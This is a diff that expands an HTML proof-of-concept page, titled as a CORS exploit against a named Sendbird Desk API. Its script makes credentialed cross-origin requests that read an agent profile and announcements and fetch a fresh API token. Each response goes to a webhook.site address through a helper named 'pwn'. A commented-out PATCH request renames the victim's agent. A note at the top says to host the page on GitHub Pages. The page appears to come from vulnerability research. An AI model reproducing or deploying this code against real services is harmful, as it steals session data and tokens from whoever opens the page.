@@ -1,12 +1,51 @@
+<!-- save as desk-cors-poc.html and push to GitHub Pages -->
 <!doctype html>
+<meta charset="utf-8">
+<title>Sendbird Desk CORS exploit</title>
 <script>
+const WEBHOOK_URL = '	https://webhook.site/965c52a8-a7cc-49dd-bf8b-dcdb58a0b70f'; // ← change me once
+
+/* helper: fire-and-forget exfil – 'no-cors' so browser skips CORS checks */
+const pwn = (tag, data) =>
+  fetch(WEBHOOK_URL, { method: 'POST', mode: 'no-cors', body: tag + ':' + data });
+
 (async () => {
-  const res = await fetch(
+  /* 1️⃣  READ: agent profile */
+  const agent = await fetch(
       'https://desk-api-us-3.sendbird.com/api/agents/27405',
-      {credentials:'include', headers:{Accept:'application/json'}}
-  );
-  const body = await res.text();
-  await fetch('	https://webhook.site/965c52a8-a7cc-49dd-bf8b-dcdb58a0b70f', {method:'POST', mode:'no-cors', body});
-  document.body.textContent = '✓ Sent – check webhook.site';
+      { credentials: 'include', headers: { Accept: 'application/json' } }
+  ).then(r => r.text());
+  await pwn('AGENT', agent);
+
+  /* 2️⃣  READ: announcements (proves SameSite=None cookie rides along) */
+  const ann = await fetch(
+      'https://desk-api-us-3.sendbird.com/api/announcements/agent',
+      { credentials: 'include' }
+  ).then(r => r.text());
+  await pwn('ANNOUNCE', ann);
+
+  /* 3️⃣  POST: steal a fresh Desk API token  --------------------------- */
+  /*  The endpoint allows POST with content-type JSON, creds included. */
+  const token = await fetch(
+      'https://desk-api-us-3.sendbird.com/api/auth/token',
+      { method: 'POST',
+        credentials: 'include',
+        headers: { 'Content-Type': 'application/json' },
+        body: '{}' }                   // body is irrelevant; empty JSON accepted
+  ).then(r => r.text());
+  await pwn('TOKEN', token);
+
+  /* 4️⃣  OPTIONAL WRITE: rename myself (needs PATCH allowed) ----------- */
+  /*  Uncomment to demo integrity impact. */
+  /*
+  await fetch(
+      'https://desk-api-us-3.sendbird.com/api/agents/27405',
+      { method: 'PATCH',
+        credentials: 'include',
+        headers: { 'Content-Type': 'application/json' },
+        body: '{"displayName":"pwned-'+Date.now()+'"}' });
+  */
+
+  document.body.textContent = '✓ exploit finished – check Webhook.site';
 })();
 </script>
